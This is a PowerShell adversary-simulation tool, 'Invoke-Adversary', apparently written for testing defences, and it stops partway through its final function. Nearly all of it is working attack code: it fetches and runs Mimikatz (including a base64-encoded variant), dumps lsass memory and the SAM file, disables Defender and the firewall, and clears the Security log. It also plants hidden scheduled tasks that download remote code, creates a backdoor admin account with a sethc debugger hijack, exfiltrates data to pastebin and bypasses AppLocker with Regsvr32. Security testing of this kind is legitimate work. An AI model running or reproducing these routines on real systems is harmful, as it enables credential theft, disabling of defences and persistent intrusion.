<#
This sample script is not supported under any standard support program or service. 
This sample sample script is provided AS IS without warranty of any kind. 
The author further disclaims all implied warranties including, without limitation, any implied warranties of merchantability 
or of fitness for a particular purpose. 
The entire risk arising out of the use or performance of the sample scripts and documentation remains with you. 
In no event shall the author, or anyone else involved in the creation, production, or delivery 
of the script be liable for any damages whatsoever (including, without limitation, damages for loss of business profits, 
business interruption, loss of business information, or other pecuniary loss) arising out of the use 
of or inability to use the sample scripts or documentation, even if the author has been 
advised of the possibility of such damages.
#>
<#
.Synopsis
   Create interactive menu
.DESCRIPTION
   Create interactive menu
.NOTES
	Author      :: Moti Bani - Moti.ba@hotmail.com 
	Version 1.0 :: 11-March-2017 :: [Release] :: Publicly available
#>
Function Write-Menu {
    [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
    Param
    (
        # Param1 help description
        [Parameter(Mandatory = $true,
            ValueFromPipelineByPropertyName = $true,
            Position = 0)]
        [string]$Header = '',

        # Param2 help description
        [System.ConsoleColor]$HeaderColor = 'Yellow',

        $Items
    )

    Begin {
    }
    Process {
        if ($Header -ne '') { 
            Write-Host "`n$Header" -ForegroundColor $HeaderColor
            $underLine = "-" * $Header.length
            Write-Host $underLine
        }

        for ($i = 0; $i -lt $Items.Count; $i++) {
            $lz = ($i + 1).ToString("000")
            Write-Host "[$lz]: $($Items[$i])"
        }

        # Wait for user input
        do {
            $selection = Read-Host "`nPlease make a selection (or 'q' to stop)"
            if ($selection -eq 'q') {
                Exit
            }
            else {
                if ([int]$selection -le $Items.Length) {
                    Return $Items[[int]$selection - 1]    
                }
            
            }
        } while ($true)
    }
    
    End {
    }
}
Function Write-LogToConsole([string]$msg) {
    $strDate = Get-Date -Format "hh:mm:ss"
    Write-Host "[*] [$strDate]`t$msg"  -ForegroundColor Yellow       
}
Function Write-CmdToConsole([string]$msg) {
    $strDate = Get-Date -Format "hh:mm:ss"
    Write-Host "[>] [$strDate]`t$msg"  -ForegroundColor Green
}
Function Write-ErrToConsole([string]$msg) {
    $strDate = Get-Date -Format "hh:mm:ss"
    Write-Host "[!] [$strDate]`t$msg"  -ForegroundColor Red
}
Function DisplayEULA(){
    
    $Eula = "
This sample script is not supported under any standard support program or service. 
This sample sample script is provided AS IS without warranty of any kind. 
The author further disclaims all implied warranties including, without limitation, any implied warranties of merchantability or of fitness for a particular purpose. 
The entire risk arising out of the use or performance of the sample scripts and documentation remains with you. 
In no event shall the author, or anyone else involved in the creation, production, or delivery 
of the script be liable for any damages whatsoever (including, without limitation, damages for loss of business profits, 
business interruption, loss of business information, or other pecuniary loss) arising out of the use 
of or inability to use the sample scripts or documentation, even if the author has been 
advised of the possibility of such damages.
"
    
    Write-Host $Eula -ForegroundColor Green -BackgroundColor Black
    Write-Host "Please read the legal discalimer carefully and approve that you are acceppting the terms
By using this script Windows system's security and stability (passwords dump,disabling security features, etc.) may be affected so DON'T RUN IT ON PRODUCTION systems 
By writing 'Yes' you acknowledge that you are aware of this and take sole responsibility for any personally identifiable or other sensitive information through your use of the script"  -ForegroundColor Red -BackgroundColor Black

    
    while ($Anwser -ne "Yes"){ $Anwser = Read-Host -Prompt "`nPlease Write Yes to acceppt the terms" }        
}

Function Init() {
    Add-Type -AssemblyName System.IO.Compression.FileSystem

    Clear-Host
    $Error.Clear()

    If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
                [Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Warning "You need to be Administrator to run all test cases"
    }
    
    Write-Host "`tTool    :: Invoke-Adversary" -ForegroundColor Magenta
    Write-Host "`tAuthor  :: Moti Bani" -ForegroundColor Magenta
    Write-Host "`tTwitter :: @Moti_Ba" -ForegroundColor Magenta
    Write-Host "`tBlog    :: http://blogs.technet.com/motiba" -ForegroundColor Magenta
    Write-Host "`tVersion :: 1.0" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "`tWarning :: Don't run this tool on production systems!" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "`tWindows Name    :: $((gwmi win32_operatingsystem).Caption)" -ForegroundColor Magenta
    Write-Host "`tWindows Version :: $([environment]::OSVersion.Version)" -ForegroundColor Magenta
    Write-Host "`tArchitecture    ::  $((gwmi win32_operatingsystem).OSArchitecture)" -ForegroundColor Magenta
    Write-Host ""
    
    DisplayEULA  
}
Function Main () {   
    
    $Tactics = @("Defense Evasion", "Persistence", "Credential Access", "Discovery", "Command and Control", "Execution", "Collection", "AppLocker ByPasses")
    
    switch (Write-Menu -Header "Main - Adversary Tactics" -HeaderColor Green -Items $Tactics) {
        "Persistence" {  Main_Persistence}
        "Discovery" { Main_Discovery}
        "Credential Access" { Main_Credentials}
        "Defense Evasion" { Main_DefenseEvasion}
        "Collection" {Main_Collection}
        "Command and Control" {Main_C2}
        "Execution" {Main_Execution}
        "AppLocker ByPasses" {Main_ApplockerBypass}
    }
}
#region AppLocker
Function Main_ApplockerBypass() {
    $subTactics = @("Regsvr32","Back to Main")
    switch (Write-Menu -Header "AppLocker ByPass" -HeaderColor Green -Items $subTactics) {
        "Regsvr32" {sub_ApplockerBypass_Regsvr32} 
        "Back to Main"{Main}
    }
    Main_ApplockerBypass
}
Function sub_ApplockerBypass_Regsvr32() {
    Start-ProcessEx -FileName "Regsvr32.exe" -Arguments "/s /n /u /i:http://example.com/file.sct scrobj.dll"
}
#endregion
#region Command and Control
Function Main_C2() {
    $subTactics = @("Commonly Used Ports", "Uncommonly Used Ports", "Web Service", "DNS - Well-Known Blacklisted IP Address", "Connect - Well-Known Blacklisted IP Address","Back to Main")
    switch (Write-Menu -Header "Command and Control" -HeaderColor Green -Items $subTactics) {
        "Commonly Used Ports" {sub_CommandAndControl_CommonPorts} 
        "Uncommonly Used Ports" {sub_CommandAndControl_UncommonPorts} 
        "Web Service" {sub_CommandAndControl_WebServicePasteBin}
        "Connect - Well-Known Blacklisted IP Address" {sub_CommandAndControl_BlacklistedIPAddresses}
        "DNS - Well-Known Blacklisted IP Address" {sub_CommandAndControl_BlacklistedIPAddressesDNS}        
        "Back to Main"{Main}
    }
    Main_C2
}
Function sub_CommandAndControl_BlacklistedIPAddressesDNS() {
    $url = "https://www.ip-finder.me/ip-full-list/"
    Write-LogToConsole "Fetching 10 Blacklisted IP address from [$($url)]"    
    $WebRequest = Invoke-WebRequest -Uri $url -Headers @{ "dnt" = "1"; "accept-encoding" = "gzip, deflate, br"; "accept-language" = "en-US,en;q=0.9"; "upgrade-insecure-requests" = "1"; "user-agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"; "accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"; "referer" = "https://www.ip-finder.me/178.137.87.242/"; "scheme" = "https"; "method" = "GET"} 
    $Links = $WebRequest.Links | Select-Object -ExpandProperty innerText -First 10 -Skip 5

    

    foreach ($link in $Links) {
        Write-LogToConsole "Resolving Blacklisted IP address: [$($link)]"  
        Start-ProcessEx -FileName "nslookup.exe" -Arguments "$link"
    }        
}
Function sub_CommandAndControl_BlacklistedIPAddresses() {    
    $url = "https://www.ip-finder.me/ip-full-list/"
    Write-LogToConsole "Fetching 10 Blacklisted IP address from [$($url)]"    
    $WebRequest = Invoke-WebRequest -Uri $url -Headers @{ "dnt" = "1"; "accept-encoding" = "gzip, deflate, br"; "accept-language" = "en-US,en;q=0.9"; "upgrade-insecure-requests" = "1"; "user-agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"; "accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"; "referer" = "https://www.ip-finder.me/178.137.87.242/"; "scheme" = "https"; "method" = "GET"} 
    $Links = $WebRequest.Links | Select-Object -ExpandProperty innerText -First 10 -Skip 5

    $ErrorActionPreference = 'SilentlyContinue'

    foreach ($link in $Links) {
        Write-LogToConsole "Connecting to Blacklisted IP address: [$($link)]"  
        Invoke-WebRequest -Uri "http://$link" -Method Get -TimeoutSec 3
    }

    $ErrorActionPreference = 'Continue'
        
}
Function sub_CommandAndControl_WebServicePasteBin() {
    $Content = (get-wmiobject win32_service -filter "name='BITS'") | out-string

    #Create Paste string from input
    $string = [System.Web.HttpUtility]::UrlEncode($($Content | Format-Table -AutoSize | Out-String))
    $PSContent = @() 
    $PSContent += "code=$($string)"
    
    Invoke-WebRequest -Uri 'http://pastebin.xyz/api/v1/paste.php' -Method Post -Body "code=$($Content)" -OutVariable response | Out-Null
	
    Write-LogToConsole "$Content copied to Pastbin URL: $($response.Content)"    
}
Function sub_CommandAndControl_UncommonPorts() {
    $HostName = Read-Host -Prompt "Hostname or IP address of server to connect"
    if (-not(Test-Connection -ComputerName $HostName -Count 2 -Quiet)) {
        Write-Warning "$HostName is not available"
    }
    else {
        Write-LogToConsole "About to communicate over a uncommonly used ports on $HostName"
        $Ports = @(1913, 81, 8081, 8088, 995, 13000)
        $ErrorActionPreference = 'SilentlyContinue'
        foreach ($Port in $Ports) {
            Write-LogToConsole "Probing port: $Port"                
            $Socket = New-Object System.Net.Sockets.TcpClient($HostName, $Port)
            if ($Socket.Connected) {
                Write-LogToConsole "Port: [($Port)] is Open"                
                $Socket.Close()
            }
        }
        $ErrorActionPreference = 'Continue'        
    }
}
Function sub_CommandAndControl_CommonPorts() {
    $HostName = Read-Host -Prompt "Hostname or IP address of server to connect"
    if (-not(Test-Connection -ComputerName $HostName -Count 2 -Quiet)) {
        Write-Warning "$HostName is not available"
    }
    else {
        Write-LogToConsole "About to communicate over a commonly used ports on $HostName"
        $Ports = @(80, 443, 25, 8080, 1433)
        $ErrorActionPreference = 'SilentlyContinue'
        foreach ($Port in $Ports) {
            Write-LogToConsole "Probing port: $Port"                
            $Socket = New-Object System.Net.Sockets.TcpClient($HostName, $Port)
            if ($Socket.Connected) {
                Write-LogToConsole "Port: [($Port)] is Open"                
                $Socket.Close()
            }
        }
        $ErrorActionPreference = 'Continue'        
    }
}
#endregion
#region Collection
Function Main_Collection() {
    $subTactics = @("Screen Capture","Back to Main")
    switch (Write-Menu -Header "Collection" -HeaderColor Green -Items $subTactics) {
        "Screen Capture" {sub_Collection_ScreenCapture}
        "Back to Main"{Main} 
    }
    Main_Collection
}
Function sub_Collection_ScreenCapture() {
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $FileName = ([System.IO.Path]::GetTempFileName()).replace("tmp", "bmp")
    Write-LogToConsole "Capturing a screenshot in $FileName in 10 seconds"
    sleep -Seconds 10

    $Objbitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $ObjGraphic = [System.Drawing.Graphics]::FromImage($Objbitmap)
    $ObjGraphic.CopyFromScreen($Left, $Top, 0, 0, $Objbitmap.Size)
    $Objbitmap.Save($FileName)
    
    Invoke-Item $FileName
    

}
#endregion
#region DefenseEvasion
Function Main_DefenseEvasion() {
    $subTactics = @("Disable network interface", "Disable Windows Defender AV", "Add local firewall rule exceptions", "Turn off Windows Firewall", "Clear Security Log","Back to Main")
    switch (Write-Menu -Header "Defense Evasion" -HeaderColor Green -Items $subTactics) {
        "Disable network interface" {sub_DefenseEvasion_DisableNIC}   
        "Add local firewall rule exceptions" {sub_DefenseEvasion_AddFirewallRule}   
        "Disable Windows Defender AV" {sub_DefenseEvasion_DisableWindowsDefenderAV}  
        "Turn off Windows Firewall" {sub_DefenseEvasion_DisableWindowsFirewall}
        "Clear Security Log" {sub_DefenseEvasion_ClearSecurityLog}
        "Back to Main"{Main}
        
    }
    Main_DefenseEvasion
}

Function sub_DefenseEvasion_ClearSecurityLog() {
    Start-ProcessEx -FileName "wevtutil.exe" -Arguments "cl Security"
}
Function sub_DefenseEvasion_DisableWindowsFirewall() {
    Start-ProcessEx -FileName "netsh.exe" -Arguments "Advfirewall set allprofiles state off"
}
Function sub_DefenseEvasion_AddFirewallRule() {
    Start-ProcessEx -FileName "netsh.exe" -Arguments "advfirewall firewall add rule name=`"Invoke-APT Test Rule`" dir=in program=`"c:\Windows\BadApp.exe`" action=allow"
}
Function sub_DefenseEvasion_DisableNIC() {
    Disable-NetAdapter "Ethernet" -Confirm:$true
}
Function sub_DefenseEvasion_DisableWindowsDefenderAV() {
    Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
    Set-MpPreference -DisableIOAVProtection $true -Verbose
    Set-MpPreference -DisableBehaviorMonitoring $true -Verbose
    Set-MpPreference -DisableIntrusionPreventionSystem $true -Verbose
    Set-MpPreference -DisablePrivacyMode $true -Verbose
}
#endregion
#region Credentials
Function Main_Credentials() {
    $subTactics = @("Mimikatz - Logonpasswords", "PowerShell Mimikatz", "PowerShell Encoded Mimikatz", "Capture Lsass Memory Dump", "Capture Lsass Memory Dump (Prodump)", "Copy Local SAM File (via Invoke-NinjaCopy)","Back to Main")
    switch (Write-Menu -Header "Credential Access Tactics" -HeaderColor Green -Items $subTactics) {
        "PowerShell Mimikatz" {sub_Credentials_Mimikatz}   
        "PowerShell Encoded Mimikatz" {sub_Credentials_EncodedMimikatz}  
        "Mimikatz - Logonpasswords" {sub_Credentials_MimikatzLogonpasswords}   
        "Capture Lsass Memory Dump" {sub_Credentials_LsassMemoryDump} 
        "Capture Lsass Memory Dump (Prodump)" {sub_Credentials_LsassMemoryProcDump} 
        "Copy Local SAM File (via Invoke-NinjaCopy)" {sub_Credentials_CopySamFile} 
        "Back to Main"{Main}
    }
    Main_Credentials
}

Function sub_Credentials_CopySamFile() {
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam" -verbose
}
Function sub_Credentials_LsassMemoryProcDump() {

    $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
    $DumpFile = [System.IO.Path]::GetTempFileName().replace(".tmp", ".dmp")
    $url = "https://live.sysinternals.com/procdump.exe"
    
    Write-LogToConsole "Downloading procdump into [$FileName]"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $FileName)
    
    Unblock-File $FileName
    Start-ProcessEx -FileName $FileName -Arguments "-accepteula -accepteula -64 -ma lsass.exe $DumpFile"

    Write-LogToConsole "Deleting procdump [$FileName]"
    Remove-Item $FileName -Force

}
Function sub_Credentials_LsassMemoryDump() {
    # Based on code: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1

    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
    $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
    $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
    $MiniDumpWithFullMemory = [UInt32] 2

    $FileName = [System.IO.Path]::GetTempFileName()
    $FileStream = New-Object IO.FileStream($FileName, [IO.FileMode]::Create)
    $Lsaass = Get-Process lsass

    Write-LogToConsole "$($Lsaass.Modules[0].FileName) current PID [$($Lsaass.Id)]"
    $Result = $MiniDumpWriteDump.Invoke($null, @($Lsaass.Handle,
            $Lsaass.Id,
            $FileStream.SafeFileHandle,
            $MiniDumpWithFullMemory,
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            [IntPtr]::Zero))

    $FileStream.Close()

    if (-not $Result) {
        Write-Error "Failed to Capture Lsass Memory Dump"
    }
    else {
        Write-LogToConsole "Memory dump created: [$FileName] Size: $((Get-ChildItem $FileName).Length)"
    }
}
Function sub_Credentials_Mimikatz() {
    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m
}
Function sub_Credentials_EncodedMimikatz() {
    Start-ProcessEx -FileName "PowerShell.exe" -Arguments "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA=="
}
Function sub_Credentials_MimikatzLogonpasswords() {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".zip")
    $Folder = [System.IO.Path]::GetDirectoryName($FileName)
    $url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180325/mimikatz_trunk.zip"
    
    Write-LogToConsole "Downloading mimikatz into [$FileName]"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $FileName)
    
    Unblock-File $FileName
    [System.IO.Compression.ZipFile]::ExtractToDirectory($FileName, $Folder)
    if([Environment]::Is64BitOperatingSystem)  {
        Write-LogToConsole "Windows is 64Bit"
        Start-ProcessEx -FileName "$Folder\x64\mimikatz.exe" -Arguments """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""
    }
    else {
        Write-LogToConsole "Windows is 32Bit"
        Start-ProcessEx -FileName "$Folder\Win32\mimikatz.exe" -Arguments """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""
    }

    Write-LogToConsole "Clean-up and remove files"
    sleep -Milliseconds 500
    Remove-Item "$Folder\x64\" -Force -Recurse
    Remove-Item "$Folder\Win32\" -Force -Recurse
    Remove-Item "$Folder\mimicom.idl" -Force 
    Remove-Item "$Folder\kiwi_passwords.yar" -Force
    Remove-Item "$Folder\README.md" -Force


}
#endregion 
#region Discovery
Function Main_Discovery() {   
    $subTactics = @("Account Discovery", "Network Service Scanning", "System Owner Discovery", "System Time Discovery", "Service Discovery", "Network Connections Discovery", "Network Session Enumeration","Back to Main")
    switch (Write-Menu -Header "Discovery Tactics" -HeaderColor Green -Items $subTactics) {
        "Account Discovery" {sub_Discovery_Accounts}    
        "Network Service Scanning" {sub_Discovery_NetworkServiceScanning}
        "System Owner Discovery" {sub_Discovery_SystemOwner}    
        "System Time Discovery" {sub_Discovery_SystemTime}
        "Service Discovery" {sub_Discovery_SystemServices}
        "Network Connections Discovery" {sub_Discovery_SystemNetworkConnections}
        "Network Session Enumeration"{sub_Discovery_SystemNetworkSessionEnum}
        "Back to Main" {Main}
    }
    Main_Discovery
}
Function sub_Discovery_SystemNetworkSessionEnum(){
    
}

Function sub_Discovery_SystemNetworkConnections() {
    Start-ProcessEx -FileName "net.exe" -Arguments "use"
    Start-ProcessEx -FileName "netstat.exe" -Arguments "-ano"
}
Function sub_Discovery_SystemServices() {
    Start-ProcessEx -FileName "net.exe" -Arguments "start"
}
Function sub_Discovery_SystemTime() {
    Start-ProcessEx -FileName "net.exe" -Arguments "time"
    Start-ProcessEx -FileName "w32tm.exe" -Arguments "/tz"
}
Function sub_Discovery_SystemOwner() {
    Start-ProcessEx -FileName "cmd.exe" -Arguments "/C whoami"
}
Function sub_Discovery_NetworkServiceScanning() {
    $HostName = Read-Host -Prompt "Hostname or IP address of server"
    if (-not(Test-Connection -ComputerName $HostName -Count 2 -Quiet)) {
        Write-Warning "$HostName is not available"
    }
    else {
        Write-LogToConsole "About to scan ports 1-1024 on $HostName"
        for ($i = 1; $i -lt 1024; $i++) { 
            $Socket = New-Object System.Net.Sockets.TcpClient($HostName, $Port)
            if ($Socket.Connected) {
                Write-LogToConsole "Port [$i] is Open"                
                $Socket.Close()
            }
        }
    }
}
Function sub_Discovery_Accounts() {
    Start-ProcessEx -FileName "net.exe" -Arguments "user /domain"
    Start-ProcessEx -FileName "net.exe" -Arguments "user"
    Start-ProcessEx -FileName "net.exe" -Arguments "group ""domain admins"" /domain"
    Start-ProcessEx -FileName "net.exe" -Arguments "group ""Exchange Trusted Subsystem"" /domain"
    Start-ProcessEx -FileName "net.exe" -Arguments "group ""enterprise admins"" /domain"
}
#endregion
#region Persistence
Function Main_Persistence() {   
    $subTactics = @("Accessibility Features", "AppInit DLLs", "Application Shimming", "Create local user", "Create local Administrator", `
            "Create New Service", "Create New Service (Unquoted Path)", "Registry Run Keys [HKLM]", "Registry Run Keys [HKCU]", "Scheduled tasks","Back to Main")
    switch (Write-Menu -Header "Persistence Tactics" -HeaderColor Green -Items $subTactics) {
        "Accessibility Features" {sub_Persistence_AccessibilityFeatures  }
        "AppInit DLLs" {sub_Persistence_AppInit}
        "Application Shimming" {sub_Persistence_ApplicationShimming}
        "Create local user" { sub_Persistence_CreateLocalUser}
        "Create local Administrator" {sub_Persistence_CreateLocalAdministrator}
        "Registry Run Keys [HKLM]" {sub_Persistence_RegistryRunKeysHKLM; Main_Persistence}
        "Registry Run Keys [HKCU]" {sub_Persistence_RegistryRunKeysHKCU; Main_Persistence}
        "Scheduled tasks" {sub_Persistence_ScheduledTasks; Main_Persistence}
        "Create New Service" {sub_Persistence_NewService}
        "Create New Service (Unquoted Path)" {sub_Persistence_NewService -Unquoted}
        "Back to Main"{Main}
    }
    Main_Persistence
}
Function sub_Persistence_NewService([switch]$Unquoted) {
    if ($Unquoted) {
        New-Service -Name "WindowsHealth" -BinaryPathName "C:\program files\myapp.exe" -DisplayName "Windows Health" -Description "Windows Health Monitor" -StartupType Automatic -Verbose    
    }
    else {
        New-Service -Name "WindowsHealth" -BinaryPathName "c:\Windows\Notepad.exe" -DisplayName "Windows Health" -Description "Windows Health Monitor" -StartupType Automatic -Verbose
    }
    #(get-wmiobject win32_service -filter "name='WindowsHealth'").delete()
}
Function sub_Persistence_ScheduledTasks() {
    Start-ProcessEx -FileName "schtasks.exe" -Arguments '/create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ''IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6''''))'" /sc onlogon /ru System'"
}
Function sub_Persistence_RegistryRunKeysHKLM() {
    Set-RegistryKey -RegKey "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" `
        -RegValue  'svchost'  -RegData '%APPDATA%\Microsoft\Network\svchost.exe' -RegType String        
}
Function sub_Persistence_RegistryRunKeysHKCU() {
    Set-RegistryKey -RegKey "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -RegValue  'svchost'  -RegData '%APPDATA%\Microsoft\Network\svchost.exe' -RegType String    
}
Function sub_Persistence_CreateLocalUser() {
    $Username = "support_388945a0" # APT3
    $Password = "password"

    $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"

    if ($adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username } -ne $null) {
        Write-LogToConsole "Creating new local user $Username."
        Start-ProcessEx -FileName "net.exe" -Arguments "USER $Username $Password /add /y /expires:never"
    }
    else {
        Write-LogToConsole "User $Username already exist, try to activate"
        Start-ProcessEx -FileName "net.exe" -Arguments "USER $Username /active:yes"
      
        Write-LogToConsole "Setting password for existing local user $Username"
        Start-ProcessEx -FileName "net.exe" -Arguments "USER $Username $Password"  
    }
} 
Function sub_Persistence_CreateLocalAdministrator() {
    $Username = "Lost_337fde69_81a9" # S-TYPE
    $Password = "pond~!@6_337fde69-81a9-442e-99d4-7cd29ecd06ad"

    $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"

    if (($adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username}) -eq $null) {
        Write-LogToConsole "Creating new local Administrator $Username."
        Start-ProcessEx -FileName "net.exe" -Arguments "USER $Username $Password /add /active:yes /y"
        Start-ProcessEx -FileName "net.exe" -Arguments "LOCALGROUP Administrators $Username /add /y"
        Start-ProcessEx -FileName "wmic.exe" -Arguments "USERACCOUNT WHERE Name='$Username' SET PasswordExpires=FALSE"
    }
    else {
        Write-LogToConsole "$Username already exist."
    }
}
Function sub_Persistence_AccessibilityFeatures() {
    Set-RegistryKey -RegKey "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" `
        -RegValue  'Debugger'  -RegData 'C:\Windows\System32\cmd.exe' -RegType String    
} 
Function sub_Persistence_AppInit() {
    Set-RegistryKey -RegKey "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" `
        -RegValue  'AppInit_DLLs'  -RegData 'pserver32.dll' -RegType String    
} 
Function sub_Persistence_ApplicationShimming() {
    Set-RegistryKey -RegKey "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{842562ef-8d28-411d-a67d-ab75ef611fe8}.sdb" `
        -RegValue  'UninstallString'  -RegData 'C:\WINDOWS\system32\sdbinst.exe -u "C:\WINDOWS\AppPatch\Custom\{842562ef-8d28-411d-a67d-ab75ef611fe8}.sdb"' -RegType String    
} 
#endregion
#region Execution
Function Main_Execution() {
    $subTactics = @("PSExec (random file name)", "PSExec (Remote)", "PowerShell API call", "Self Delete (batch file)","WMI Process Execution","Back to Main")
    switch (Write-Menu -Header "Execution Tactics" -HeaderColor Green -Items $subTactics) {
        "PSExec (random file name)" {sub_Execution_PSExecRandom}
        "PSExec (Remote)" {sub_Execution_PSExecRemote}
        "PowerShell API call" {sub_Execution_PSAPICall}
        "Self Delete (batch file)" {sub_Execution_SDelete}
        "WMI Process Execution"{sub_Execution_WmiProcess}        
        "Back to Main"{Main}
    }
    Main_Execution
}

Function sub_Execution_WmiProcess(){
    $HostName = Read-Host -Prompt "Hostname or IP address of server to connect"
    Start-ProcessEx -FileName "wmic.exe" -Arguments "/node:$HostName process call create ""cmd.exe /c whoami"""
}
Function sub_Execution_SDelete() {
    $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".cmd")
    Set-Content $FileName 'del "%~f0"' -Encoding ASCII

    Start-ProcessEx -FileName "cmd.exe" -Arguments "/c $FileName"
}
Function sub_Execution_PSAPICall() {
    Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
 
public static class User32Dll
{
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern bool MessageBox(
            IntPtr hWnd,     /// Parent window handle 
            String text,     /// Text message to display
            String caption,  /// Window caption
            int options);    /// MessageBox type
}
"@   
    [User32Dll]::MessageBox(0, "API Call Succeed", "Invoke-Adversary", 0) |Out-Null
}
Function sub_Execution_PSExecRemote() {
    $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
    $url = "https://live.sysinternals.com/psexec.exe"
    
    Write-LogToConsole "Downloading PSExec into [$FileName]"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $FileName)
    
    Unblock-File $FileName
    $HostName = Read-Host -Prompt "Hostname or IP address of server to connect"
    Start-ProcessEx -FileName $FileName -Arguments "\\$HostName -accepteula -s cmd.exe /c whoami"

    Write-LogToConsole "Deleting PSExec [$FileName]"
    Remove-Item $FileName -Force
}
Function sub_Execution_PSExecRandom() {
    $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
    $url = "https://live.sysinternals.com/psexec.exe"
    
    Write-LogToConsole "Downloading PSExec into [$FileName]"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $FileName)
    
    Unblock-File $FileName
    Start-ProcessEx -FileName $FileName -Arguments "-accepteula -s cmd.exe /c whoami"

    Write-LogToConsole "Deleting PSExec [$FileName]"
    Remove-Item $FileName -Force
}
#endregion 
Function Start-ProcessEx {
    Param
    (
        [string]$FileName,
        [string]$Arguments
    )    

    $props = @{
        'Stdout'   = $null;
        'Stderr'   = $null;
        'ExitCode' = 0;
    }

    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName = $FileName
    $pinfo.RedirectStandardError = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute = $false
    $pinfo.CreateNoWindow = $true
    $pinfo.Arguments = $Arguments
    $pinfo.WindowStyle = "hidden"
    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = $pinfo

    Write-LogToConsole "Executing: $FileName $Arguments"  

    $p.Start() | Out-Null
    $props.Stdout = $p.StandardOutput.ReadToEnd()
    $props.Stderr = $p.StandardError.ReadToEnd()

    $p.WaitForExit()
 

    $props.ExitCode = $p.ExitCode
    
    Write-LogToConsole "Process ID: [$($p.Id)] Exit Code: [$($props.ExitCode)]"  
    
    if ($props.ExitCode -ne 0) {
        Write-ErrToConsole  $props.Stderr   
    }
    else {
        Write-CmdToConsole $props.Stdout
    }
    
}
Function Set-RegistryKey() {
    Param
    (
        $RegKey,
        $RegValue,
        $RegData,
        [ValidateSet('String', 'DWord', 'Binary', 'ExpandString', 'MultiString', 'None', 'QWord', 'Unknown')]
        $RegType = 'String'    
    )

    If (-not (Test-Path $RegKey)) {
        Write-LogToConsole "The key $RegKey not exists. Try to set value"
        Try {
